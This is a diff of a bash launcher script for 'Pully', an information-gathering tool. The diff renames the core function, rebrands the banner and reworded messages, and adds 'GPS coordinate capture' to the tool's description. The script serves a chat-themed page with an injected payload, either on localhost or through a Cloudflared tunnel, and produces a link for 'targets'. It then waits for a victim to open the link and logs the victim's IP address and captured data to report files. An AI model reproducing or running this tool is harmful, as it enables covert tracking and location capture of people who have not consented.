@@ -1,32 +1,26 @@
 #!/bin/bash
-# Pully v 0.2
-# Powered by Ankon Polley
-# visit [Instagram]: https://www.instagram.com/itz_vorzhevik_volnyshev?igsh=OTNqMndzdDFzZ293
-# alt: [Instagram] https://www.instagram.com/its_ankon_polley?igsh=MXQyNnVpcGV2bmF5aw==
+# Pully v 1.0
+# Author: Ankon Polley
+# GitHub: https://github.com/anknpolley123/Pully.git
 
 trap 'printf "\n";stop' 2
 
 banner() {
 clear
-printf '\n'
-printf '  _____  _    _  _       _      __     __\n'
-printf ' |  __ \| |  | || |     | |     \ \   / /\n'
-printf ' | |__) | |  | || |     | |      \ \_/ / \n'
-printf ' |  ___/| |  | || |     | |       \   /  \n'
-printf ' | |    | |__| || |____ | |____    | |   \n'
-printf ' |_|     \____/ |______||______|   |_|   \n'
-printf '\n'
-printf '\e[1;31m         Pully Ver 0.2 - by Ankon Polley\e[0m \n'
-printf '\e[1;93m     https://github.com/anknpolley123/Pully\e[0m \n'
-printf '\e[1;92m   IG: itz_vorzhevik_volnyshev | Alt: its_ankon_polley\e[0m \n'
-printf '\e[1;90m Pully is a simple and light tool for information gathering.\e[0m \n'
-printf '\n'
+printf '\n       ██████  ██    ██ ██      ██      ██    ██ \n' 
+printf '       ██   ██ ██    ██ ██      ██       ██  ██  \n'
+printf '       ██████  ██    ██ ██      ██        ████   \n'
+printf '       ██      ██    ██ ██      ██         ██    \n'
+printf '       ██       ██████  ███████ ███████    ██    \n\n'
+printf '\e[1;34m       ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀\n'                                                                                
+printf " \e[1;93m      Pully Ver 1.0 - by Ankon Polley\e[0m \n"
+printf " \e[1;92m      GitHub: https://github.com/anknpolley123/Pully.git \e[0m \n"
+printf "\e[1;90m Pully is a tool for information gathering and GPS coordinate capture.\e[0m \n"
+printf "\n"
 }
-
 
 dependencies() {
 command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; } 
-
 }
 
 stop() {
@@ -47,21 +41,16 @@ exit 1
 }
 
 catch_ip() {
-
 ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
 IFS=$'\n'
-printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
+printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Target IP:\e[0m\e[1;77m %s\e[0m\n" $ip
 cat ip.txt >> saved.ip.txt
-
 }
 
 checkfound() {
-
 printf "\n"
-printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting for targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
 while [ true ]; do
-
-
 if [[ -e "ip.txt" ]]; then
 printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
 catch_ip
@@ -72,9 +61,7 @@ sleep 0.5
 done 
 }
 
-
 cf_server() {
-
 if [[ -e cloudflared ]]; then
 echo "Cloudflared already installed."
 else
@@ -93,19 +80,19 @@ wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/l
 fi
 fi
 chmod +x cloudflared
-printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
+printf "\e[1;92m[\e[0m+\e[1;92m] Starting PHP server...\n"
 php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
 sleep 2
-printf "\e[1;92m[\e[0m+\e[1;92m] Starting cloudflared tunnel...\n"
+printf "\e[1;92m[\e[0m+\e[1;92m] Starting Cloudflared tunnel...\n"
 rm cf.log > /dev/null 2>&1 &
 ./cloudflared tunnel -url 127.0.0.1:3333 --logfile cf.log > /dev/null 2>&1 &
 sleep 10
 link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "cf.log")
 if [[ -z "$link" ]]; then
-printf "\e[1;31m[!] Direct link is not generating \e[0m\n"
+printf "\e[1;31m[!] Direct link generation failed. \e[0m\n"
 exit 1
 else
-printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
+printf "\e[1;92m[\e[0m*\e[1;92m] Pully Link:\e[0m\e[1;77m %s\e[0m\n" $link
 fi
 sed 's+forwarding_link+'$link'+g' template.php > index.php
 checkfound
@@ -113,12 +100,13 @@ checkfound
 
 local_server() {
 sed 's+forwarding_link+''+g' template.php > index.php
-printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server on Localhost:8080...\n"
+printf "\e[1;92m[\e[0m+\e[1;92m] Starting PHP server on Localhost:8080...\n"
 php -S 127.0.0.1:8080 > /dev/null 2>&1 & 
 sleep 2
 checkfound
 }
-hound() {
+
+pully() {
 if [[ -e data.txt ]]; then
 cat data.txt >> targetreport.txt
 rm -rf data.txt
@@ -129,7 +117,7 @@ rm -rf ip.txt
 fi
 sed -e '/tc_payload/r payload' index_chat.html > index.html
 default_option_server="Y"
-read -p $'\n\e[1;93m Do you want to use cloudflared tunnel?\n \e[1;92motherwise it will be run on localhost:8080 [Default is Y] [Y/N]: \e[0m' option_server
+read -p $'\n\e[1;93m Use Cloudflared tunnel? [Y/N] (Default: Y): \e[0m' option_server
 option_server="${option_server:-${default_option_server}}"
 if [[ $option_server == "Y" || $option_server == "y" || $option_server == "Yes" || $option_server == "yes" ]]; then
 cf_server
